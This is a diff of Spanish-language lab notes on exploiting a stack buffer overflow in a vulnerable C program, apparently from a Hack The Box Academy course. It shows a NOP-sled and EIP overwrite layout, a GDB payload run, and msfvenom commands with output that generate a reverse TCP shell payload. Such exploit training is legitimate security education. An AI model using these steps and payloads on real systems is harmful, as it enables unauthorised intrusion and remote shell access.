@@ -1,7 +1,6 @@
 # Vulnerable Program
 
 Ahora estamos escribiendo un programa C simple llamado ``bow.c`` con una función vulnerable llamada ``strcpy()``.
-
 ## Bow.c
 
 ```c
@@ -256,15 +255,17 @@ A menudo puede resultar útil insertar algunos `no operation instruction`( `NO
 3. `150 bytes`para nuestro `shellcode`.
 
 ```shell-session
-   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
-     NOPs = "\x90" * 100
+Para llegar al EIP = "\55" * 1040
+NOPs = "\x90" * 100
 Shellcode = "\x44" * 150
-      EIP = "\x66" * 4
+EIP = "\x66" * 4
+
+Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
 ```
 
 ![](../Images/Pasted%20image%2020240920125948.png)
 
-#### GFB
+#### GDB
 
 ```shell-session
 (gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
@@ -450,6 +451,18 @@ Este proceso debe repetirse hasta eliminar todos los caracteres que podrían int
 0xRh4ps00dy@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
 ```
 
+```shell-session
+0xRh4ps00dy@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
+
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of c file: 425 bytes
+Saved as: shellcode
+```
+
 #### Shellcode
 
   ```shell-session
@@ -566,6 +579,9 @@ uid=1000(student) gid=1000(student) groups=1000(student),4(adm),24(cdrom),27(sud
 
 Ahora vemos que obtuvimos una conexión desde la dirección IP local. Sin embargo, no es obvio si tenemos un shell. Por lo tanto, escribimos el comando "`id`" para obtener más información sobre el usuario. Si obtenemos un valor de retorno con información, sabemos que estamos en un shell, como se muestra en el ejemplo.
 
+# Referencias
+
+https://academy.hackthebox.com/module/31/section/385
 
 
 
